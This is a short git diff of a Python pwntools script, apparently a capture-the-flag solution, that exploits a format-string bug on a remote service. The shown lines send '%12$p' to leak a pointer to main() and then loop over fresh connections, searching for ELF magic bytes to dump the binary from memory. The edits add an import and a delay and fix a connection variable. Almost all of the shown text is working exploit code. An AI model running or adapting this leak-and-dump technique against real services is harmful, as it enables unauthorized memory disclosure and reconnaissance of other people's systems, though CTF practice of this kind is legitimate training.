@@ -1,6 +1,7 @@
 #String Format Dump Binary!!!
 
 from pwn import *
+from struct import *
 
 ip, port = '178.128.46.49', 32460
 #io = remote(ip, port)
@@ -66,6 +67,7 @@ def detect():
 def leak_pointer_to_main():
 	'''12th pointer is one from the main()'''
 	io.sendline(b"%12$p")
+	sleep(0.2)
 	io.recvuntil(b"> ")
 	leak_all = io.recv()
 	leak = leak_all.decode().split("\n")[0]
@@ -97,7 +99,7 @@ elf_found = True
 addr = 0
 leaked_main = 0
 while elf_found:
-	p = remote(ip,port)
+	io = remote(ip,port)
 	print("CURRENT ADDRESS = " + hex(addr))
 	leaked_main = leak_pointer_to_main() + addr
 	addr, elf_found = search_elf_magic_bytes(leaked_main,addr)
